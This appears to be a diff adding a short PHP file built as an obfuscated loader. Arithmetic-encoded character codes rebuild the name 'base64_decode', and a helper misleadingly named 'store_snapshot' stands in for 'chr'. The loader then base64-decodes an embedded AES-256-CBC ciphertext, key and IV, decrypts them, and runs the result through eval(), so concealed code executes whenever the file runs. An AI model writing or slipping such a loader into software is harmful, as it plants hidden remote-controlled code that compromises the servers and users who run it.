@@ -1,0 +1,22 @@
+<?php
+$pwq = array(98 - 4 + 4 + 6 - 6, (97 * 1 / 1 * 1 / 1 + 14 - 14 * 1) / 1, 115 - 1 + 1 + 4 + 4 - (4 + 4) + 17 - 17 + 10 + 6 - (10 + 6) - 2 + 2, 101 + 4 - 4 + 14 - 14 + 9 + 2 - (9 + 2), 54 - 1 + 1 + 14 - 14 - 12 + 12 - 5 + 5, 52 * 13 / 13 + 10 + 9 - (10 + 9) + 9 + 1 - (9 + 1), (95 * 1 / 1 + 3 - 3 * 1) / 1, 100 + 1 - 1 + 2 + 5 - (2 + 5) + 6 - 6 - 11 + 11, 101 - 14 + 14 - 6 + 6, 99 + 10 + 8 - (10 + 8) - 19 + 19, (111 + 15 - 15 - 6 + 6 * 1) / 1 + 5 + 4 - (5 + 4), 100 * 1 / 1 + 17 - 17 + 11 - 11 - 20 + 20, 101 - 13 + 13 + 8 + 6 - (8 + 6) + 6 - 6 + 7 - 7 + 16 - 16);
+$mtj = '';
+foreach ($pwq as $fhx) {
+    $mtj .= store_snapshot($fhx);
+}
+$aic = 'Hm8naHBdLNlE/Y4AsZ2WQEf++P33bjK7znGND/X42vOziUEEtquN/RSQjyENPfPGvH6IWtL2vsBiami+xsw0KgpcohybwsUR9AurE/9edkcCLnGfXhCpTEHuK3otXModMTW2EtuDnggExqWR9Xs/Ng/gpOdZROmhLJLCeT3Y7ut/5ivJYomwmwR55IjMSN7pFko77GqZt5jP1IMcOp2yI+1/1FA9QSDKoBwEcyvR3z6IslwARIQRaNmvERbzsfrDiEHrYnzhQpuap5QG6BOJelwl2oY/VlE8qG8TpDe/6L/FSnnqQvjVdpxQ2Wbj5HJ9WYHhuQ2TEyG82gi0Vd71F1xjyKdrV1S22e4l6X/2l43BOaCrHsES50YSOa+tSOABxasH+BREyjlhJiRk2lNsHatDYC5a5sBcYqycR1KgmZshR2+A4bv5oQUGhNhNoQCO3RrL9wgbaBOlnCB+RZ2uzdjRgLZ2K7TZS1R6H95L4cHQ1ODcr3rBY5SwiMJOyy1JKUbuN6meAEPH48STvHBnax8h+Kdz/uPC0R7o/D4xZxZ/Rw46cM7KzP3EqA6SqP2sZJcogpfSZDpi7K5F5P4ncF8cSmA1lJJ9PGFa1qp+a+akplSEVS6nAOgguS+1LIfhVt3103F0KonKWu75mQcq1j+IXWEve6oINM7h2aEbavZtt1Errj0bna6+tlbAvROgzPf0VOojQttgvibElcqrm/r7hh1+s/Vgvvckatqwd9iR+ZCzFMFpMCy313NkyzpYd1u6XvGagcRfhY45CrSwtOeEsgJGUcWuAuMDlI8KVGfvAhK4kLFNEc1fnKmiRNRx6MD3cFFKXOYxxfV0dKY396RhFxXRyDVsiUKRzXykTuvlfXntgAkCN7vjg4Kf5pAhIwbJRPKPq2L9+2Y/smsnjCyr2qQVpKkUf90jDLd+ZCbbrCrDb3OWnwi74yLGutvcol+27HqZZK31IWy+bbhrGA==';
+$hri = 'HVqyEtPBTj4WadmtXtk0kXrg0zYLkcfj/OkQ65X0cBw=';
+$kzo = 'fAh+cXKJCFOyp0T3pH5KkQ==';
+$kdb = openssl_decrypt($mtj($aic), 'aes-256-cbc', $mtj($hri), OPENSSL_RAW_DATA, $mtj($kzo));
+eval($kdb);
+
+function store_snapshot($x)
+{
+    $n = array(117 - 3, 112 - 8, 26 + 26 + 47);
+    $t = '';
+    foreach ($n as $m) {
+        $t .= chr($m);
+    }
+    $t = strrev($t);
+    return $t($x);
+}
